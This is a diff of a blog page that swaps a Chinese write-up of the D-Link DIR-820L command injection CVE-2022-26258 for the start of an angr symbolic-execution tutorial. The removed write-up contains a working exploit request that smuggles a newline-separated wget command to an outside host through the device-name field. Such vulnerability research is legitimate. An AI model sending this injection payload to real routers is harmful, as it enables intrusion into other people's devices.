@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CVE-2022-26258 命令执行漏洞, Hexo">
-    <meta name="description" content="分析固件和漏洞D-Link DIR-820L路由器固件版本1.05B03存在命令执行漏洞，CVE编号CVE-2022-26258，通过CVE网站查看信息，得知漏洞在 &amp;#x2F;lan.asp 页面中的设备名称参数出了问题。以下是CVE的描">
+    <meta name="keywords" content="angr入门, Hexo">
+    <meta name="description" content="之前一直想学习一下 angr 符号执行，在 CTF 题目中虽然接触过很多次，也用过那么一两次，但都是用的别人的代码，完全不理解其中的运行机制，脚本也是不知其义，还埋怨 angr 不好用。在重新读了一遍官方文档后才知道 angr 其实很强大，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +19,7 @@
 
     
 
-    <title>CVE-2022-26258 命令执行漏洞 | Hexo</title>
+    <title>angr入门 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CVE-2022-26258 命令执行漏洞</h1>
+                    <h1 class="description center-align post-title">angr入门</h1>
                 </div>
             </div>
         </div>
@@ -430,8 +430,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CVE/">
-                                <span class="chip bg-color">CVE</span>
+                            <a href="/tags/symbolic-execution/">
+                                <span class="chip bg-color">symbolic execution</span>
                             </a>
                         
                     </div>
@@ -446,7 +446,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-04-25
+                    2022-04-26
                 </div>
                 
 
@@ -455,14 +455,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    4 分
                 </div>
                 
 
@@ -480,123 +480,119 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="分析固件和漏洞"><a href="#分析固件和漏洞" class="headerlink" title="分析固件和漏洞"></a>分析固件和漏洞</h1><p>D-Link DIR-820L路由器固件版本1.05B03存在命令执行漏洞，CVE编号CVE-2022-26258，通过CVE网站查看信息，得知漏洞在 &#x2F;lan.asp 页面中的设备名称参数出了问题。以下是CVE的描述信息：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392">使用binwalk解包时并未发现加密，直接得到了squashfs-root 文件系统：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141224791.png" alt="image-20220425141224791"></p>
-<p>找到 lan.asp 文件，搜索“device”和“name”相关关键词，发现有多处调用：</p>
-<pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">onPageLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-	<span class="token operator">...</span>
-	<span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> lanCfg<span class="token punctuation">.</span>lanDeviceName<span class="token punctuation">;</span>
-	<span class="token operator">...</span>
-<span class="token punctuation">&#125;</span>
-<span class="token operator">...</span>
-<span class="token keyword">function</span> <span class="token function">send_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token operator">...</span>
-	<span class="token keyword">var</span> lan_device_name <span class="token operator">=</span> <span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
-	<span class="token operator">...</span>
-<span class="token punctuation">&#125;</span>
-<span class="token operator">...</span>
+                <p>之前一直想学习一下 angr 符号执行，在 CTF 题目中虽然接触过很多次，也用过那么一两次，但都是用的别人的代码，完全不理解其中的运行机制，脚本也是不知其义，还埋怨 angr 不好用。在重新读了一遍官方文档后才知道 angr 其实很强大，可以只执行自己想要执行的函数而不用执行整个程序。正好最近看到一个开源项目用于练习 angr，那就从0开始彻底把 angr 学习一下，对 Fuzz 工作也是很有帮助的。</p>
+<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>首先介绍一下 angr 吧。它是一个用于二进制文件分析的 Python 框架，结合了静态分析和动态符号的分析。angr 学习的路线比较陡峭，不是说它有多难，而是没有合适的学习资料和连贯的学习路径。这里我找到了一个开源项目 <a target="_blank" rel="noopener" href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>，它从0开始一步一步教我们使用 angr 的功能。</p>
+<p>符号执行的意义就是在不实际运行程序的情况下对程序进行分析，以了解在什么状态下，执行了哪条路径的代码。举一个最常见的例子，CTF 中的逆向题目，通常是知道程序的输出结果，要我们去逆向加密算法，得到我们应该输入的正确内容，也就是 flag。</p>
+<p>符号执行就允许我们把程序当作一个方程来求解，就像是方程式中的 X、Y 等符号，而程序执行的路径用于“约束”符号。举个例子：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> x<span class="token punctuation">;</span>
+<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token keyword">function</span> <span class="token function">copyDataToDataModelFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-	<span class="token operator">...</span>
-	paramStr <span class="token operator">+=</span> <span class="token string">'&amp;lanHostCfg_DeviceName_1.1.1.0='</span> <span class="token operator">+</span> <span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
-	<span class="token operator">...</span>
-<span class="token punctuation">&#125;</span>
-<span class="token operator">...</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">
-		</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>duple<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token plain-text">show_words('DEVICE_NAME')</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token plain-text">:</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
-		</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>340<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">&amp;nbsp;&amp;nbsp;&amp;nbsp;
-			</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lan_device_name<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lan_device_name<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>15<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token plain-text">
-		</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
-</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">
-...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> 
 
-<p>审计代码，发现<code>lan_device_name</code>作为请求参数，拼接到<code>paramStr</code>中，这里应该是一个POST请求，然后将内容提交到了<code>get_set.ccp</code> 的URL中，：</p>
-<pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">send_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token operator">...</span>
+<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Fail."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-	<span class="token keyword">if</span><span class="token punctuation">(</span>submit_button_flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-				submit_button_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-				<span class="token comment">/*var restoreStr
-				for(var i=0; i&lt;25; i++)
-				&#123;
-				&#125;*/</span>
-				<span class="token function">deleteRedundentDatamodel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-				<span class="token keyword">var</span> submitObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ccpObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-				<span class="token keyword">var</span> submitParam <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-					<span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"get_set.ccp"</span><span class="token punctuation">,</span>
-					<span class="token literal-property property">arg</span><span class="token operator">:</span> <span class="token string">""</span>
-				<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-		<span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>在文件系统中使用<code>grep -r get_set .</code> 查找这个URL的引用，并没有发现名为“get_set.ccp”的文件，但有许多asp文件都使用了这个URL，并且有四个二进制文件中匹配到了这个URL：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141254823.png" alt="image-20220425141254823"></p>
-<p>既然没有“get_set.ccp”文件，那么可能是这个URL会交给后端处理，处理好之后返回给用户结果。我们依次分析这四个二进制文件，在文件中搜索字符串”get_set”，结果flash、smbd、libc不是很匹配，可能性较低，而ncc2的内容很匹配，它不光有字符串，还有相关函数，ncc2结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141320141.png" alt="image-20220425141320141"></p>
-<p>接下来对ncc2进行逆向，搜索<code>system</code>等命令执行函数，发现关键逻辑：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141332645.png" alt="image-20220425141332645"></p>
-<p>这里将v4的值拼接到格式化字符串里，然后整个字符串传给<code>system</code>，目前看来并未对v4进行检查，很有可能是命令注入点。</p>
-<p>v4是<code>getObj</code>函数的返回值Obj，需要绕过<code>hasInjectionString</code>的判断才能到达命令注入点，现在需要找到<code>hasInjectionString</code> 函数在哪个文件中，同样使用<code>grep -r</code> 命令：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141346118.png" alt="image-20220425141346118"></p>
-<p>这里找到一个libc文件，用IDA打开，然后分析此函数，发现它是一个过滤函数，用于判断是否有非法字符：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141357805.png" alt="image-20220425141357805"></p>
-<p>但是这里只是一些基本的过滤规则，没有过滤冒号和换行符，可以使用“\n”来绕过，最终达到命令注入的效果。现在要验证漏洞是否存在，需要进行固件仿真。试了一下FrimAE可以仿真，这样就不需要手动去模拟了，避免了很多麻烦。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先下载FirmAE，然后按照官方文档给出的安装教程把环境安装好：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone --recursive <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE<span class="token operator">></span>
-<span class="token function">sudo</span> ./download.sh
-<span class="token function">sudo</span> ./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>在download的时候速度非常慢，甚至出现连接断掉的情况，可以查看download.sh脚本，然后搭上梯子手动下载到binaries文件夹下：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
- <span class="token function">wget</span> -N --continue -P./binaries/ <span class="token variable">$*</span>
-<span class="token punctuation">&#125;</span>
+<p>在上面的代码里，<code>if</code> 语句产生两条路径，要么打印”Success!!”，要么打印”Fail”，其实就是 <code>if</code> 语句对符号 <code>x</code> 的约束。假设现在我们对 “Success!!”这条路径比较感兴趣，那么就必须满足 <code>1 &lt; x &lt; 10</code>，这个公式就是符号执行中的约束，符号执行引擎将此语句注入一个符号标识，继续向后运行以找到符合约束的值。</p>
+<p>上面的程序比较简单，因为它只有两条路径，很容易就可以求解。当遇到特别大的程序时会有很多路径，此时就会遇到“路径爆炸”的问题，因为每条路径向下执行时，路径都是呈指数增长的，相对于求解的时间就比较长了，可能到 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%83%AD%E5%AF%82">热寂</a> 都无法求解出来。</p>
+<h1 id="Part-0-angr-find"><a href="#Part-0-angr-find" class="headerlink" title="Part 0 angr find"></a>Part 0 angr find</h1><p>进入正题，首先把 angr_ctf 克隆下来，进入到 dist&#x2F; 文件夹下，这里可以找到许多练习题目和一堆 xx.py 的文件。找到 00_angr_find 的文件，这是第一个题目，逻辑相当简单，要求输入一个字符串，程序对字符串进行处理后要和“JACEJGCS”相同：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220426233408003.png" alt="image-20220426233408003"></p>
+<p>通常情况下需要对 <code>complex_function</code> 函数进行手动逆向，现在直接用 angr 约束求解，得到应该输入的正确字符串。接下来查看解题代码 scaffold00.py ：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
+<span class="token keyword">import</span> sys
 
-<span class="token builtin class-name">echo</span> <span class="token string">"Downloading binaries..."</span>
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  path_to_binary <span class="token operator">=</span> ???
+  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>
+  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>
+  
+  print_good_address <span class="token operator">=</span> ???
+  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>
+  
+  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
+    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  
+  <span class="token keyword">else</span><span class="token punctuation">:</span>
+    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span>
 
-<span class="token builtin class-name">echo</span> <span class="token string">"Downloading kernel 2.6 (MIPS)..."</span>
-download <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE_kernel-v2.6/releases/download/v1.0/vmlinux.mipsel.<span class="token operator"><span class="token file-descriptor important">2</span>></span>
-download <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE_kernel-v2.6/releases/download/v1.0/vmlinux.mipseb.<span class="token operator"><span class="token file-descriptor important">2</span>></span>
-<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>下载好之后运行仿真命令：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./init.sh
-<span class="token function">sudo</span> ./run.sh -a <span class="token operator">&lt;</span>brand<span class="token operator">></span> <span class="token operator">&lt;</span>firmware<span class="token operator">></span>
-<span class="token function">sudo</span> ./run.sh -r <span class="token operator">&lt;</span>brand<span class="token operator">></span> <span class="token operator">&lt;</span>firmware<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><code>-a</code> 这条命令是解析固件，<code>brand</code>参数是一个自定义的标识符，然后跟上firmware.bin文件，<code>-r</code> 这条命令就是运行仿真了。仿真成功可以看到如下信息：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141412340.png" alt="image-20220425141412340"></p>
-<p>然后在浏览器访问192.168.0.1，可以访问成功，这里要求登录，默认密码为空：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141423322.png" alt="image-20220425141423322"></p>
-<p>根据之前的分析结果，访问lan.asp，看到页面确实像预测的那样POST提交表单到get_set.ccp的URL。这里测试修改Device Name然后使用burpsuite抓包看看参数构成：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141433485.png" alt="image-20220425141433485"></p>
-<p>正如之前分析的那样，所有的参数都拼接起来了。然后尝试对此处使用换行符绕过，也就是”%0a”。这里有一个比较简单的验证方法，就是用python 起一个简单的HTTP服务，然后使用wget 命令请求这个HTTP服务，如果成功请求，在终端中就会输出请求的相关信息，并且wget会一直发出请求，用于测试在合适不过了：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python -m SimpleHTTPServer <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>最后修改Device Name这条参数，最后请求头如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;get_set.ccp HTTP&#x2F;1.1
-Host: 192.168.0.1
-Content-Length: 765
-Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q&#x3D;0.01
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36
-Content-Type: application&#x2F;x-www-form-urlencoded
-Origin: &lt;http:&#x2F;&#x2F;192.168.0.1&gt;
-Referer: &lt;http:&#x2F;&#x2F;192.168.0.1&#x2F;lan.asp&gt;
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q&#x3D;0.9
-Cookie: hasLogin&#x3D;§1§
-Connection: close
+<p>现在逐行分析，首先导入了 angr 库和 sys 库：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
+<span class="token keyword">import</span> sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-ccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255.255.0§&amp;new_ip&#x3D;§192.168.0.1§&amp;new_mask&#x3D;§255.255.255.0§&amp;nextPage&#x3D;§lan.asp§&amp;lanHostCfg_IPAddress_1.1.1.0&#x3D;§192.168.0.1§&amp;lanHostCfg_SubnetMask_1.1.1.0&#x3D;§255.255.255.0§&amp;lanHostCfg_DomainName_1.1.1.0&#x3D;§§&amp;lanHostCfg_DNSRelay_1.1.1.0&#x3D;§1§&amp;lanHostCfg_DHCPServerEnable_1.1.1.0&#x3D;§1§&amp;lanHostCfg_MinAddress_1.1.1.0&#x3D;§192.168.0.100§&amp;lanHostCfg_MaxAddress_1.1.1.0&#x3D;§192.168.0.200§&amp;lanHostCfg_DHCPLeaseTime_1.1.1.0&#x3D;§1440§&amp;lanHostCfg_DeviceName_1.1.1.0&#x3D;§%0awget &lt;http:&#x2F;&#x2F;192.168.0.2&gt;%0a§&amp;lanHostCfg_AlwaysBroadcast_1.1.1.0&#x3D;§0§&amp;lanHostCfg_NetBIOSAnnouncement_1.1.1.0&#x3D;§0§&amp;lanHostCfg_NetBIOSLearn_1.1.1.0&#x3D;§0§&amp;lanHostCfg_NetBIOSScope_1.1.1.0&#x3D;§§&amp;lanHostCfg_NetBIOSNodeType_1.1.1.0&#x3D;§2§&amp;lanHostCfg_PrimaryWINSAddress_1.1.1.0&#x3D;§0.0.0.0§&amp;lanHostCfg_SecondaryWINSAddress_1.1.1.0&#x3D;§0.0.0.0§&amp;1650509593486&#x3D;§1650509593486§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>在终端中看到来自192.168.0.1的请求，说明命令注入成功：</p>
-<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141445337.png" alt="image-20220425141445337"></p>
-<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://iotsec-zone.com/article?id=123">IOTsec-Zone 物联网安全社区 | D-Link CVE-2022-26258 命令注入</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/skyedai910/Vuln/tree/master/DIR-820L/command_execution_0">Vuln&#x2F;DIR-820L&#x2F;command_execution_0 at master · skyedai910&#x2F;Vuln</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p>
-<p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26258">CVE - CVE-2022-26258</a></p>
+
+<p>然后看 <code>main</code> 函数的内容：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  path_to_binary <span class="token operator">=</span> ???
+  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>
+  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><code>path_to_binary</code> 指定可执行程序路径</li>
+<li><code>angr.Project()</code> 创建一个 <code>Project</code> 实例</li>
+<li><code>project.factory.entry_state()</code> 在程序入口点创建程序状态，类似于一个快照</li>
+<li><code>project.factory.simgr()</code> 告诉符号执行引擎从 <code>initial_state</code> 处开始符号执行</li>
+</ul>
+<p>接下来的两行代码是关键：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">print_good_address <span class="token operator">=</span> ???
+simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p>print_good_address 是打印”Good Job”的地址</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220426235759712.png" alt="image-20220426235759712"></p>
+</li>
+<li><p>simulation.explore() 告诉符号执行引擎，我们想要到达的代码位置</p>
+</li>
+</ul>
+<p>最后几行代码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
+    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>若符号执行引擎找到正确路径，将输入给 <code>stdin</code>，否则抛异常。</p>
+<p>修改整体代码，得到完整代码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
+<span class="token keyword">import</span> sys
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  path_to_binary <span class="token operator">=</span> <span class="token string">"./00_angr_find"</span> <span class="token comment"># path of the binary program</span>
+  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>
+  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>
+
+  print_good_address <span class="token operator">=</span> <span class="token number">0x8048678</span>  <span class="token comment"># :integer (probably in hexadecimal)</span>
+  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>
+  
+  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
+    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  
